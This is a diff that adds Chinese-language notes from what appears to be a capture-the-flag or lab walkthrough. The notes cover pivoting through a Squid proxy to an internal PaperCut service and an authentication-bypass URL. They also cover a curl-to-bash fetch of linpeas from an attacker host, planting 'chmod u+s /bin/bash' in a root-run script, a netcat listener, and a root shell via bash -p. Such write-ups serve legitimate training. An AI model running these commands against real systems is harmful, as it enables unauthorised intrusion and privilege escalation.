@@ -60,3 +60,42 @@ zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa
 [★]$ chmod 600 id_rsa //-rw-------
 [★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N //-N 不执行远程命令
 ```
+#### Web_squid代理端口 Form Bombar
+```
+端口工具 https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
+Squid 的Privoxy代理工具： Squidscan -> https://gist.github.com/xct/597d48456214b15108b2817660fdee00 //扫描内部端口
+
+[1] 设置代理[★]$ echo 'http 10.129.238.16  3128' | sudo tee -a /etc/proxychains4.conf //需注释掉：#socks4 	127.0.0.1 9050
+
+[2]用 curl 测试 HTTP 的命令 ｜ 你 → Squid代理(3128) → 内网端口9191
+[★]$ proxychains4 curl -v http://10.129.238.16:9191
+
+[3] burpsuite代理访问 127.0.0.1:9191/user 
+$ burpsuite -> Setting -> Network -> Connetctions -> Upstream proxy servers -> add
+Destination host    *
+Proxy host          10.129.238.16
+Proxu port          3128
+要关掉拦截 Proxy → Intercept → Intercept is off ！！！！
+
+linpeas 是一个自动化的本地 Linux 枚举脚本 //找路径
+[★]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+papercut@bamboo:~$ curl  http://10.10.14.27:9000/linpeas.sh | bash
+
+在burpsuite代理登录 http://127.0.0.1:9191/app?service=page/SetupCompleted 即可绕过登录
+
+pspy :无 root 权限也能监控系统进程的工具
+[★]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+
+以 root 权限运行且位于可写目录中的脚本名称是什么？server-command
+papercut@bamboo:~$ cd /home/papercut/server/bin/linux-x64
+papercut@bamboo:~/server/bin/linux-x64$ echo 'chmod u+s /bin/bash' > server-command
+点击“Enable Printing”->Pint Deploy ->Pirnt queues -> Import BYOD-friendly print queues -> Next -> Start Imporing Mobility Print printers -> Refresh servers
+
+[★]$ nc -lvnp 5544
+$ script /dev/null -c /bin/bash
+bash-5.1$ cd tmp
+bash-5.1$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+bash-5.1$ /bin/bash -p
+bash-5.1# id
+```
